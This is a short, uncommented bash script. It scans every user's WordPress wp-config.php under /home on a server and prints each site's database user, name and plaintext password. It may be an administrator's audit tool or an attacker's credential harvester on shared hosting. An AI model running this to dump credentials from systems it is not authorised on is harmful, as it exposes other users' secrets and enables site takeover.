
#!/bin/bash

for i in `ls /home/*/public_html/wp-config.php`
do
         domain=`echo $i | awk -F "/" '{ print $3}'`
         echo "Domain: $domain"
         user=`cat $i | grep DB_USER | awk -F "'" '{ print $4}' `
         database=`cat $i | grep DB_NAME |  awk -F "'" '{ print $4}' `
         password=`cat $i | grep DB_PASSWORD |  awk -F "'" '{ print $4}' `
         echo $user $password $database
done
